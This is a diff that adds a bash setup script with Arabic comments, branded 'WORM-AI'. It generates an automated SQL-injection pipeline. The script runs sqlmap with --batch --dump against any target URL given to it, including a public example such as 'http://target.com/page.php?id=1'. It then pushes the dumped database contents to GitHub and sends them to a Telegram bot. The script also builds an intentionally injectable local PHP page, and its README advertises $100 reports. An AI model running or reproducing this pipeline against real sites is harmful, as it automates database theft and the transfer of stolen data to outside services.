@@ -1,3 +1,13 @@
+#!/bin/bash
+# ============================================================
+# WORM-AI💀🔥 – الاستعادة الكاملة للمشروع
+# هذا الملف ينشئ كل الأدوات التي طوّرناها في جلسة واحدة.
+# ============================================================
+
+echo "[WORM] 🔧 بدء إنشاء بيئة العمل..."
+
+# ---------- 1. إنشاء الأداة الأساسية (sqli_forensic_v3.py) ----------
+cat > sqli_forensic_v3.py <<'PY_EOF'
 #!/usr/bin/env python3
 import re, json, os, sys, csv, base64, requests, argparse, shutil, glob, subprocess
 from datetime import datetime
@@ -224,3 +234,103 @@ if __name__ == "__main__":
         if args.telegram: p.send_to_telegram(out)
         if args.clean: shutil.rmtree(out); print(f"[WORM] 🧹 Cleaned {out}/")
     print("\n[WORM] 💀 All missions completed.")
+PY_EOF
+
+# منح صلاحية التنفيذ للأداة
+chmod +x sqli_forensic_v3.py
+
+# ---------- 2. إنشاء سكربت التشغيل المتكامل (run_full_pipeline.sh) ----------
+cat > run_full_pipeline.sh <<'BASH_EOF'
+#!/bin/bash
+# ============================================================
+# AWR Security Labs – Full Pipeline Script
+# Usage: ./run_full_pipeline.sh [TARGET_URL]
+# Example: ./run_full_pipeline.sh "http://testphp.vulnweb.com/listproducts.php?cat=1"
+# ============================================================
+
+set -e
+TARGET_URL="${1:-http://localhost:8080/vuln.php?id=1}"
+echo "[WORM] 🎯 Target: $TARGET_URL"
+
+# تحقق من المتغيرات البيئية (GitHub + Telegram)
+if [ -z "$GITHUB_TOKEN" ] || [ -z "$TELEGRAM_BOT_TOKEN" ] || [ -z "$TELEGRAM_CHAT_ID" ]; then
+    echo "[WORM] ❌ Missing env vars. Set GITHUB_TOKEN, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID"
+    echo "Example: export GITHUB_TOKEN='...' && export TELEGRAM_BOT_TOKEN='...' && export TELEGRAM_CHAT_ID='...'"
+    exit 1
+fi
+
+# إذا كان الهدف محلياً، نجهز البيئة
+if [[ "$TARGET_URL" == *"localhost"* ]]; then
+    echo "[WORM] 🔧 Setting up local target..."
+    pkill -f "php -S localhost:8080" 2>/dev/null || true
+    cd ~/sqlmap-lab
+    rm -f test.db vuln.php
+    sqlite3 test.db <<< "CREATE TABLE users (id INTEGER, username TEXT, password TEXT); INSERT INTO users VALUES (1,'admin','123456'), (2,'user','password'), (3,'shadow','hackme');"
+    echo '<?php $db = new SQLite3("test.db"); $id = $_GET["id"]; $res = $db->query("SELECT * FROM users WHERE id = $id"); while($row = $res->fetchArray(SQLITE3_ASSOC)) { echo "User: " . $row["username"] . " - Pass: " . $row["password"] . "<br>"; } ?>' > vuln.php
+    php -S localhost:8080 > /dev/null 2>&1 &
+    sleep 2
+    cd ~/sqlmap-dev
+fi
+
+# تشغيل الهجوم
+echo "[WORM] ⚡ Running sqlmap on $TARGET_URL ..."
+python sqlmap.py -u "$TARGET_URL" --batch --dump > sqlmap_full.log 2>&1
+echo "[WORM] ✅ Attack done."
+
+# تحليل ورفع وإرسال
+echo "[WORM] 🔍 Analyzing..."
+python3 /root/sqlmap-dev/sqli_forensic_v3.py sqlmap_full.log --push --telegram --clean
+
+# تنظيف الخادم المحلي
+if [[ "$TARGET_URL" == *"localhost"* ]]; then
+    pkill -f "php -S localhost:8080" 2>/dev/null || true
+fi
+
+echo "[WORM] 💀 Done. Remember to revoke your tokens."
+BASH_EOF
+
+chmod +x run_full_pipeline.sh
+
+# ---------- 3. إنشاء ملف تعليمات (README.txt) ----------
+cat > README.txt <<'TXT_EOF'
+============================================================
+AWR Security Labs – حزمة الأدوات الكاملة
+============================================================
+
+-----------
+1. sqli_forensic_v3.py      - الأداة الاحترافية لتحليل سجلات SQLmap
+2. run_full_pipeline.sh      - سكربت التشغيل المتكامل (هجوم + تحليل + رفع + إرسال)
+3. هذا الملف (README.txt)   - الإرشادات
+
+-----------------
+1. تأكد من تثبيت sqlmap و Python 3 و requests:
+   pip install requests
+
+2. عرّف المتغيرات البيئية (للرفع والإرسال):
+   export GITHUB_TOKEN="ghp_YourToken"
+   export TELEGRAM_BOT_TOKEN="876...:AAH..."
+   export TELEGRAM_CHAT_ID="123456789"
+
+3. لتشغيل الأداة على سجل موجود:
+   python3 sqli_forensic_v3.py sqlmap.log --push --telegram
+
+4. لتشغيل الدورة الكاملة (هجوم + تحليل + رفع + إرسال):
+   ./run_full_pipeline.sh "http://target.com/page.php?id=1"
+
+5. للبحث التلقائي عن سجلات في المجلد الحالي:
+   python3 sqli_forensic_v3.py --push --telegram
+
+---------
+- جميع التقارير تُحفظ بصيغ (MD, JSON, CSV) و PDF إن وجد pandoc.
+- سعر التقرير: ١٠٠ دولار (يظهر في التقرير نفسه).
+
+============================================================
+TXT_EOF
+
+echo "[WORM] ✅ تم إنشاء الملفات التالية:"
+echo "   - sqli_forensic_v3.py"
+echo "   - run_full_pipeline.sh"
+echo "   - README.txt"
+echo ""
+echo "[WORM] 💀 تم تجهيز كل شيء. الآن أصبح لديك ملف إعداد واحد (setup.sh) يعيد إنشاء كل الأدوات في أي وقت."
+echo "[WORM] لاستخدامها، اتبع التعليمات في README.txt"
